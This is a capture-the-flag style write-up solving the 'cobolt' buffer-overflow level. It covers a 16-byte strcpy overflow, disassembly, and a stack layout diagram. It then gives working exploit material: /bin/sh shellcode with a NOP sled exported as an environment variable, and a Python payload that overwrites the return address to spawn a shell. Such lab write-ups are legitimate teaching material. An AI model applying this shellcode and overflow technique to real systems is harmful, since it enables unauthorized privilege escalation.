# Vulnerability
In gremlin's home directory, There is a file named as cobolt, and C code is provided, too.

Little difference is buffer size is changed 256 to 16 bytes. Now, It is not able to give shellcode into buffer.
```c
char buffer[16];
strcpy(buffer, argv[1]);
```
It uses strcpy to copy argv[1] to buffer[16].

strcpy() function doesn't check parameter's length so I can overwrite SFP & RET Address.

# Exploitation
To check whether dummy bytes exist or not, disassemble cobolt's main function:
```assembly
0x8048430 <main>:	push   %ebp
0x8048431 <main+1>:	mov    %esp,%ebp
0x8048433 <main+3>:	sub    $0x10,%esp
```
It only uses ```0x10```(16) bytes, No any dummy bytes.

Then, the structure of cobolt would be like:
```
---------------------------------
| buffer[16] | SFP[4] | RET[4] |
---------------------------------
```

I will write NOP & Shellcode into Environment Variable and write the variable's address into RET Address.

To get the address, write a simple C code:
```c
#include <stdio.h>
int main(void) {
        printf("Address of SHELLCODE: 0x%x\n", getenv("SHELLCODE"));
}
```

Export environment variable, compile c code, get SHELLCODE's address:
```bash
[gremlin@localhost gremlin]$ export SHELLCODE="`python -c 'print "\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"'`"
[gremlin@localhost gremlin]$ 
[gremlin@localhost gremlin]$ gcc -o ./getsh ./getsh.c 
[gremlin@localhost gremlin]$ ./getsh 
Address of SHELLCODE: 0xbffffe67
[gremlin@localhost gremlin]$ 
```

```
---------------------------------------------
| NOP[16] | SFP[4] | RET[4] (env's address) |
---------------------------------------------
```

# Payload
```python
import os
from struct import *

payload = ""
payload = payload + "\x90" * 16
payload = payload + "AAAA" # SFP
payload = payload + "\x67\xfe\xff\xbf" # RET

os.execv('/home/gremlin/cobolt', ["", payload])
```
